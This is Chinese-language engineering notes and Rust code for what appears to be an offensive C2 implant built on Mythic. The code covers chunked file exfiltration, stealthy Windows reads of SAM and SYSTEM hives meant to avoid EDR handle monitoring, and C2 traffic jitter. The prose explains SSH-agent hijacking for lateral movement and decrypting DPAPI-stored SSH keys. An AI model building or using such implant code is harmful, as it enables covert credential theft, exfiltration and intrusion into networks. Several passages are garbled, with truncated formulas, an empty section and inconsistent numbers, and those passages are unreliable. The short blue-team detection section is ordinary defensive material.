  ### 一、 关键遗漏点 1：缺少“分片净载荷（Net Payload）与 Base64 膨胀系数”的精准预算

  #### 现象与隐患：

  在 crypto.rs 中，定义了：
  • MAX_PLAINTEXT_LEN = 2960（单切片最大明文容量）

  但是，大文件分片中的数据是经过 Base64 编码后再填入 JSON 的：
  FileChunkPayload 最终会序列化成如下 JSON：

    {"action":"upload","task_id":"...","file_id":"...","chunk_num":1,"total_chunks":100,
  "chunk_data":"SGVsbG8..."}

  • Base64 膨胀问题：原始二进制文件数据在 Base64 编码后，体积会膨胀约为 4/3 ≈ 133.3%。
  • JSON
  协议头开销：action、task_id（36B）、file_id（36B）、chunk_num（~10B）、total_chunks（~10B

  项目目前没有定义“磁盘实际读取原始字节数（Raw Read Size）”的换算常量。
  如果直接从磁盘读取 2960 字节，经过 Base64 编码后变成 ≈ 3946 字节，加上 JSON 头后会超过
  MAX_PLAINTEXT_LEN (2960)，直接导致 pack_message() 触发 BufferOverflow 错误！

  #### 💡 优化方案（精准净载荷预算）：

  必须在 crypto.rs 或 models.rs 中推导出真实磁盘单次读取的安全 Raw 字节上限：

  150) × 0.75 ≈ 𝟐𝟏𝟎𝟕 字 节
                                                                             4

  如果后续要升级到 64KB 动态切片，必须同步按此公式重新推算 MAX_PLAINTEXT_LEN 和

  #### 遗漏问题：

  在将原始磁盘二进制转为 Base64 文本时，如果用于存放临时 Base64 字符串的内存区没有进行
  zeroize，会导致文件明文的 Base64 编码碎片残留在栈/堆中。

  #### 💡 优化方案：

  确保 Base64 编解码的临时暂存区（out_b64 缓冲区）在发送完毕后，同步调用

  对 Wisconsin 项目在“流式切片”设计目标上的优化清单：

  1. 补全 Raw 读取尺寸预算公式：解决 Raw Read -> Base64 -> JSON -> AES 的体积膨胀溢出问题。

  5. 全链路 Base64 缓冲区擦除：确保从磁盘二进制到 Base64 文本的全程无内存残留。

🧠 方案可行性与深度学术/工程论证

1. 密码学与 JSON 膨胀预算论证 (Points 1 & 6)

- 论证依据：RFC 4648 (Base64) 规定 3 字节输入生成 4 字节 ASCII；PKCS#7 在 16 字节分组加密下要求输入必须补齐至下一个 16 字节倍数。Mythic C2 的消息封装通过 AES-CBC + HMAC-SHA256 后，外部还会再次套一层 Base64。
- 物理瓶颈：crypto.rs 中 MAX_PLAINTEXT_LEN = 2960 是指解密后第一层明文 JSON 的物理缓冲区上限。
- 严格边界数学推导：
  - 独立切片报文：

```text
JSON Overhead ≈ 150B,   PKCS7 Worst = 16B

Available Base64 = 2960 - 150 - 16 = 2794B

                                        16B物理对齐安全值
Max Raw Read = ⌊2794 × 0.75⌋ = 2095.5B ──────────────────→ 𝟐𝟎𝟖𝟎B
```

  - 心跳顺风车报文 (PostResponseMessage 嵌套)：
    外层包含 `{"action":"post_response","responses":[...]}`，新增 45B 结构开销：

```text
Available Base64 = 2960 - 150 - 45 - 16 = 2749B

                                         4B Base64块对齐安全值
Max Raw Read = ⌊2749 × 0.75⌋ = 2061.75B ──────────────────────→ 𝟐𝟎𝟏𝟔B
```

- 结论：硬编码 2960B 磁盘读取必定导致溢出。将磁盘单次读取定为 2016B (顺风车) 与 2080B (独立包) 是数学上的绝对上限。

──────

2. Windows 内核文件共享锁与句柄驻留论证 (Point 11)

- 论证依据：Windows 内核 NtCreateFile 的 ShareAccess 参数控制文件锁。若使用 Rust 标准库默认 File::open()，其 ShareAccess 默认不包含 FILE_SHARE_WRITE (2) 或 FILE_SHARE_DELETE (4)。
- 隐患证明：当红队试图导出目标主机上的 SAM、SYSTEM 注册表 Hive、services.db 或正在运行的日志文件时，默认 open 会请求独占读，抛出 ERROR_SHARING_VIOLATION (32) 导致导出失败；若长时间持有 File Handle，EDR (如 Defender / CrowdStrike) 的 Handle Callback 钩子 (EtwTI) 会持续监控该句柄的生命周期。
- 结论：必须采用 share_mode(7)（即 READ | WRITE | DELETE）并在单次切片 Read 完成后立即 Close Handle，做到无状态 (Stateless) 零句柄驻留。

──────

3. Rust 内存模型与 UB 避坑论证 (Points 5 & 9)

- 论证依据：Rust 2024 引用有效性不变式 (Validity Invariant) 规定，任何可变引用 &mut [u8] 覆盖的区域不能包含未初始化内存；同时，对同一块重叠内存做源与目标的读写（Aliasing Violation）属于标准未定义行为 (Undefined Behavior, UB)。
- 隐患证明：C2 Downloader 接收切片时，raw_buf 存放着从 Base64 解压出来的明文 JSON。若直接在 raw_buf 的 chunk_data 区域就地做 base64::decode_slice() 写回 raw_buf[0..N]，解码写入会破坏后面未解码的 Base64 文本，且触发 Rust 重叠借用 UB 崩溃。
- 结论：必须在物理上分离 JSON 解析缓冲区 (raw_buf) 与磁盘落地写入暂存区 (out_binary_buf)。

```rust
/// 原始二进制包物理上限 (保持 3072 字节)
pub const MAX_RAW_LEN: usize = 3072;

/// 单切片解密后明文 JSON 容量物理上限
pub const MAX_PLAINTEXT_LEN: usize = 2960;

/// Base64 文本缓冲区推荐上限
pub const MAX_B64_LEN: usize = 4096;

/// 【优化点 1】独立 FileChunkPayload 单次磁盘读取安全 Raw 上限 (无外层 responses 数组)
/// 计算公式: (2960 - 150B JSON头 - 16B PKCS7) * 0.75 = 2095.5B -> 16字节物理对齐取 2080B
pub const MAX_RAW_STANDALONE_READ: usize = 2080;

/// 【优化点 6】心跳顺风车报文 (PostResponseMessage 嵌套) 单次磁盘读取 Raw 上限
/// 计算公式: (2960 - 150B内层 - 45B外层responses - 16B PKCS7) * 0.75 = 2061.75B -> 4字节Base64对齐取 2016B
pub const MAX_RAW_PIGGYBACK_READ: usize = 2016;

/// 硬件级内存刷零 (防止 LLVM 死码消除)
#[inline(always)]
pub fn zeroize_slice(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        unsafe {
            core::ptr::write_volatile(byte, 0);
        }
    }
}
```

```rust
// src/profiles/models.rs

use sha2::{Sha256, Digest};

// ==========================================
// 【优化点 4, 7, 10】多任务并发、重传锁步与流式 SHA-256 上下文
// ==========================================

/// 单文件传输任务上下文追踪器 (无锁、无动态堆分配)
pub struct ChunkTaskContext {
    pub task_id_hash: u64,     // Task UUID 的 Hash 判别值
    pub file_id_hash: u64,     // File UUID 的 Hash 判别值
    pub current_chunk: u32,    // 当前期待/发送的分片序号 (从 1 开始)
    pub total_chunks: u32,     // 总分片数
    pub seek_offset: u64,      // 物理 Seek 偏移量
    pub raw_chunk_size: usize, // 单片 Raw 规格 (2016B 或 2080B)
    pub retry_count: u8,       // 失败重试计数器 (最大 5 次)
    pub is_acked: bool,        // 是否获得 C2 确认
    pub hasher: Sha256,        // 流式增量 SHA-256 状态机
}

impl ChunkTaskContext {
    pub fn new(task_id_hash: u64, file_id_hash: u64, total_chunks: u32, raw_chunk_size: usize) -> Self {
        Self {
            task_id_hash,
            file_id_hash,
            current_chunk: 1,
            total_chunks,
            seek_offset: 0,
            raw_chunk_size,
            retry_count: 0,
            is_acked: false,
            hasher: Sha256::new(),
        }
    }

    /// 推进到下一个切片，更新物理 Seek 偏移
    #[inline(always)]
    pub fn advance(&mut self) {
        self.current_chunk += 1;
        self.seek_offset = (self.current_chunk as u64 - 1) * (self.raw_chunk_size as u64);
        self.retry_count = 0;
        self.is_acked = true;
    }

    /// 增量更新 Hash 状态
    #[inline(always)]
    pub fn update_hash(&mut self, data: &[u8]) {
        self.hasher.update(data);
    }

    /// 完成 Hash 计算并返回 32 字节哈希数组
    #[inline(always)]
    pub fn finalize_hash(self) -> [u8; 32] {
        self.hasher.finalize().into()
    }
}

// ==========================================
// 【优化点 3】FileChunkPayload 边界与 Padding 校验强化
// ==========================================

impl<'a> FileChunkPayload<'a> {
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action.is_empty() {
            return Err(ModelError::InvalidAction);
        }
        if self.task_id.is_empty() || self.file_id.is_empty() {
            return Err(ModelError::MissingRequiredField);
        }
        if self.chunk_num == 0 || self.chunk_num > self.total_chunks {
            return Err(ModelError::InvalidChunkInfo);
        }
        // 【关键防御 1】：末片数据不可为空 (除非总文件大小就是 0)
        if self.is_last_chunk() && self.chunk_data.is_empty() && self.total_chunks > 1 {
            return Err(ModelError::InvalidChunkInfo);
        }
        // 【关键防御 2】：Base64 编码文本长度必须是 4 的倍数
        if self.chunk_data.len() % 4 != 0 {
            return Err(ModelError::InvalidChunkInfo);
        }
        Ok(())
    }
}
```

```rust
// src/profiles/http.rs

impl<'a> HttpProfile<'a> {

    // ==========================================
    // 【优化点 2】解析服务端下发的 Download 切片报文
    // ==========================================

    #[inline(never)]
    pub fn parse_file_chunk_response<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<FileChunkPayload<'de>, HttpError> {
        let chunk: FileChunkPayload<'de> = self.unpack_message(payload_b64, raw_buf)?;
        chunk.validate().map_err(|_| HttpError::ServerResponseError)?;
        Ok(chunk)
    }

    // ==========================================
    // 【优化点 5】包含 Base64 擦除的全管线安全切片打包
    // ==========================================

    #[inline(never)]
    pub fn build_file_chunk_payload_secure(
        &self,
        chunk: &FileChunkPayload<'_>,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        let res = self.pack_message(chunk, raw_buf, out_b64);
        // 【防物理内存残留】强制物理刷零中间二进制 raw_buf
        zeroize_slice(raw_buf);
        res
    }

    // ==========================================
    // 【优化点 9】双缓冲区隔离的 Download 切片安全解码器
    // ==========================================

    /// 零堆分配解码 C2 下发的 Base64 切片
    ///
    /// * `chunk_b64`: 来自 FileChunkPayload 的 Base64 文本切片
    /// * `out_binary_buf`: 专用于写入磁盘的切片暂存区 (物理上独立于 raw_buf，彻底杜绝 UB)
    pub fn decode_download_chunk_secure(
        chunk_b64: &str,
        out_binary_buf: &mut [u8],
    ) -> Result<usize, HttpError> {
        let b64_bytes = chunk_b64.as_bytes();
        let decoded_len = base64::prelude::BASE64_STANDARD
            .decode_slice(b64_bytes, out_binary_buf)
            .map_err(|_| HttpError::JsonDeserializeFailed)?;
        Ok(decoded_len)
    }
}
```

模块四：Windows 隐蔽 I/O 与 C2 流量整形范式

在实际 Agent 执行模块中应用【优化点 8】与【优化点 11】：

```rust
// 针对 Windows 平台的高隐蔽无锁 Seek 读取范式 (优化点 11)
#[cfg(windows)]
pub fn read_chunk_stealth(
    path: &str,
    offset: u64,
    buf: &mut [u8],
) -> Result<usize, std::io::Error> {
    use std::os::windows::fs::OpenOptionsExt;
    use std::fs::OpenOptions;
    use std::io::{Seek, SeekFrom, Read};

    // 0x07 = FILE_SHARE_READ (1) | FILE_SHARE_WRITE (2) | FILE_SHARE_DELETE (4)
    // 强制声明全共享，完全避免阻碍目标系统其他进程读写该文件
    let mut file = OpenOptions::new()
        .read(true)
        .share_mode(7)
        .open(path)?;

    file.seek(SeekFrom::Start(offset))?;
    let bytes_read = file.read(buf)?;

    // 函数作用域结束，Handle 立即 close，内存与内核句柄表中无任何驻留
    Ok(bytes_read)
}

// 流量整形与动态 Jitter 注入 (优化点 8)
pub fn inject_chunk_jitter(base_ms: u64, jitter_percent: u8) {
    if base_ms == 0 { return; }
    let rand_val = u16::from_le_bytes(rand::random());
    let delta = (base_ms * (rand_val as u64 % jitter_percent as u64)) / 100;
    let sleep_ms = if rand_val % 2 == 0 { base_ms + delta } else { base_ms.saturating_sub(delta) };
    std::thread::sleep(core::time::Duration::from_millis(sleep_ms));
}
```

  ### 二、 顺风车交互协议格式详解
  #### 1. 底层传输协议：OpenSSH Agent Protocol 帧格式

  Thanatos 的 ssh2-rs 驱动在与本地 Agent 套接字通信时，遵循 OpenSSH Agent
  Protocol（基于 IETF draft-miller-ssh-agent 规范）。
  通信基于二进制流，每个数据包的基础帧格式为：
    +--------------------+---------------+------------------------+
    | 4 字节数据长度 (L) | 1 字节消息类型 |      消息内容 Payload   |
    | (uint32, 大端序)   | (1 字节 uint8) |      (L - 1 字节)      |
    +--------------------+---------------+------------------------+

  ##### (1) 公钥身份枚举 (Identity Request & Answer)
  • Thanatos -> SSH Agent (SSH2_AGENTC_REQUEST_IDENTITIES, 类型码 11)：
    00 00 00 01  0B
    [   长度 1  ] [Type=11]

  • SSH Agent -> Thanatos (SSH2_AGENT_IDENTITIES_ANSWER, 类型码 12)：
    [4B uint32: 长度] [1B Type=12] [4B uint32: 密钥数量 N]
    -- 重复 N 次 --
      [4B uint32: Key Blob 长度] [Key Blob: 包含算法如 ssh-rsa/ecdsa-sha2
  与公钥参数]
      [4B uint32: Comment 长度]  [Comment 字符串，如 "admin@bastion"]


  ##### (2) 挑战响应签名（顺风车签名的核心步骤）

  当目标 SSH 远程服务器向 Thanatos 发送公钥认证质询（Challenge）时，Thanatos
  通过 Agent 代理发起签名：

  • Thanatos -> SSH Agent (SSH2_AGENTC_SIGN_REQUEST, 类型码 13)：
    [4B uint32: 长度] [1B Type=13]
    [4B uint32: Key Blob 长度]   [目标公钥 Blob]
    [4B uint32: 待签名数据长度]  [包含会话 ID、用户名、服务名的待签名摘要]
    [4B uint32: Flags]          [签名算法标志位，如 0x02 表示 SHA-256 RSA]

  • SSH Agent -> Thanatos (SSH2_AGENT_SIGN_RESPONSE, 类型码 14)：
    [4B uint32: 长度] [1B Type=14]
    [4B uint32: Signature 长度]  [格式化签名，包含算法字符串与 R/S 签名值]
  Thanatos 将此签名封装在 SSH 包中发回目标服务器，鉴权宣告完成。

  #### 2. 上层 C2 编排协议格式（Mythic RPC Tasking）

  在 Thanatos 与 Mythic C2 控制台之间，Piggybacking 控制通过 JSON
  报文进行编排：

  • ssh-agent 操作控制帧：

  ### 三、 Windows 10 与 Windows 11 下的内部机制演进与红队攻防

  在 Windows 环境下，SSH Agent 的实现原理与 Linux（Unix Domain
  Socket）存在本质差异。在现代 Windows 平台进行 Red Teaming
  研究时，必须重点关注以下系统底层机制的演进：

  #### 1. 架构演进：从 PuTTY Pageant 到 Windows 原生 OpenSSH Agent

  • 早期 Windows（Windows 10 1809 之前）：
  Windows 无原生 OpenSSH。用户主要依赖 PuTTY 的 Pageant 工具。Pageant 采用
  Windows GUI 消息机制（通过隐藏窗口类名 Pageant 接收 WM_COPYDATA
  消息）进行通信。红队进行 Piggybacking
  时需定位窗口句柄并跨进程投递内存指针。
  • Windows 10（1809+ / RS5）及 Windows 11：
  微软将 OpenSSH 正式内置为 Windows 功能（通过可选功能安装），其后台服务为
  ssh-agent.exe（服务名 ssh-agent），通常以 NT AUTHORITY\SYSTEM
  权限运行在系统会话中。

  #### 2. 通信媒介演进：Unix Domain Socket 与 Named Pipe

  • 命名管道通信：在 Windows 10 和 11 上，OpenSSH Agent 默认监听的 IPC
  终结点是一个著名的命名管道（Named Pipe）：

    \texttt{\textbackslash\textbackslash.\textbackslash pipe\textbackslash
  openssh-ssh-agent}

  • AF_UNIX 的引入：虽然 Windows 10 Build 17063 及更高版本（包括 Windows
  11）已经在 Winsock (ws2_32.dll) 中支持了 Unix 域套接字（AF_UNIX），但
  Windows 官方维护的 OpenSSH 服务仍然以 Named Pipe 作为标准传输介质。
  • 红队复用挑战：Thanatos 使用的 ssh2-rs 主要是对 libssh2 的绑定。在 Windows
  上直接读取 SSH_AUTH_SOCK 路径若指向命名管道，需底层库支持 Windows Named
  Pipe 适配层。如果以普通权限运行，跨权限访问该管道受 DACL 严格控制。

  #### 3. 密钥持久化与 Windows DPAPI（关键演进差异）

  Linux 的 ssh-agent 通常仅驻留于临时内存，会话注销或重启后即消失。然而在
  Windows 10 和 Windows 11 上，微软对 OpenSSH Agent
  增加了本地持久化存储机制：

  • 当用户执行 ssh-add 添加密钥后，Windows OpenSSH Agent
  会将私钥持久化加密保存在注册表项中：
      • 用户范围：HKCU\Software\OpenSSH\Agent\Keys
      • 系统范围：HKLM\SOFTWARE\OpenSSH\Agent\Keys
  • DPAPI 保护：私钥数据采用 Windows DPAPI (CryptProtectData)
  加密，密钥与用户的登录凭据绑定。
  • 红队/渗透测试含义：
      • 在 Windows 10/11 提权至 SYSTEM 权限后，红队人员不仅能 Piggyback
      监听当前管道，还能直接通过令牌模拟（SeImpersonatePrivilege）或者利用类
      似 Mimikatz、SharpDPAPI
      等工具解密注册表中的持久化私钥，直接从“顺风车借用”升级为“私钥永久离线提
      权”。


  #### 4. 蓝队监控与 EDR 检测演进

  • 管道事件审计：Windows 11 及带有 Sysmon 的 Windows 10 可通过 Sysmon Event
  ID 17/18（Pipe Created / Pipe Connected） 监控针对 \pipe\openssh-ssh-agent
  的异常跨进程连接行为。
  • 异构父子进程与网络行为：Thanatos 这类 Agent 若在 svchost.exe
  或未知非系统进程中产生对目标网段端口 22 的连续 TCP 握手，结合缺少常规 SSH.
  exe 进程树衍生特征，容易触发行为告警。

  ### 总结

  在 Thanatos 架构中，Piggybacking 的核心是 “凭据状态的借调与复用”：

  1. 它通过利用宿主环境遗留的合法认证套接字/命名管道，完成了利用 OpenSSH
  Agent 协议规范的免密横向穿越；
  2. 在 Windows 10/11 演进背景下，该机制从传统的 Unix Socket 跨越到了 Windows
  命名管道与 DPAPI 持久化注册表，极大地拓宽了内网渗透中的无凭据横向战术面；
  3. 同时结合 C2 报文捎带机制与 Tokio
  异步重定向转发，实现了网络层面与凭据层面的双重“搭便车”
